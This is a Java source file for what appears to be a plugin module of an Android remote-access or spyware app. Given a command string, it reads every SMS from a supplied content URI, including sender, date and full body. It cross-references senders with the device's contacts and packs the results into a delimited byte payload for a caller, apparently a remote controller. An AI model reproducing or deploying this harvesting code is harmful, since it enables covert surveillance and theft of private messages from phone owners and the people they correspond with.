package plugens.angel.plugens;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.Date;

public class sms {
    private static String SPL_DATA = "x0D0x";
    private static String SPL_ARRAY = "x0A0x";
    private static String SPL_LINE = "x0L0x";
    private static String OBJ = "<Object>";
    public Object method(Context c, String s, byte[] b) throws UnsupportedEncodingException {
        byte[] f = "null".getBytes();
        String[] d = s.split(SPL_DATA);
        switch(d[0]){
            case "sms":
                try {

                        StringBuffer sb = new StringBuffer();
                        ArrayList<String> gr_nu = new ArrayList<>();
                        ArrayList<String> gr_na = new ArrayList<>();
                        Uri uri = Uri.parse(d[1]);
                        Cursor mc = c.getContentResolver().query(uri, new String[]{"_id", "thread_id", "address", "person", "date", "body", "type"}, null, null, null);
                        String[] col = new String[]{"address", "person", "date", "body", "_id", "type", "thread_id"};

                        if (mc !=null && mc.getCount() > 0) {
                            String name = null;

                            try {
                                ContentResolver crr = c.getContentResolver();
                                Cursor cr = crr.query(ContactsContract.Data.CONTENT_URI, null,
                                        ContactsContract.Data.HAS_PHONE_NUMBER + "!=0 AND (" + ContactsContract.Data.MIMETYPE + "=? OR " + ContactsContract.Data.MIMETYPE + "=?)",
                                        new String[]{ContactsContract.CommonDataKinds.Email.CONTENT_ITEM_TYPE, ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE},
                                        ContactsContract.Data.CONTACT_ID);
                                while (cr.moveToNext()) {
                                    name = cr.getString(cr.getColumnIndex(ContactsContract.Data.DISPLAY_NAME));
                                    String number = cr.getString(cr.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                                    gr_nu.add(number);
                                    gr_na.add(name);
                                }
                            } catch (Exception e) {}

                            while (mc.moveToNext()) {
                                String address = mc.getString(mc.getColumnIndex(col[0]));
                                long date = mc.getLong(mc.getColumnIndex(col[2]));
                                String message = mc.getString(mc.getColumnIndex(col[3]));
                                //String handle = mc.getString(mc.getColumnIndex(col[4]));
                                Date date_0 = new Date(date);
                                try{
                                    int i = gr_nu.indexOf(address);
                                    if (i != -1) {
                                        name = gr_na.get(i);
                                    }else{
                                        name = null;
                                    }
                                } catch (Exception e) {}

                                String tag = message;
                                if (tag.length() > 15) {
                                    tag = tag.substring(0, 15) + "...";
                                }
                                sb.append(address + SPL_ARRAY + name + SPL_ARRAY + date_0.toString() + SPL_ARRAY + tag + SPL_ARRAY + message + SPL_ARRAY + uri.getPath() + SPL_LINE);
                             }
                        }

                    String s0 = OBJ + SPL_DATA + sb.toString() ;
                    f =  s0.getBytes();
                    return f;
                } catch (Exception e) {}
                break;
        }
        return f;
    }

}
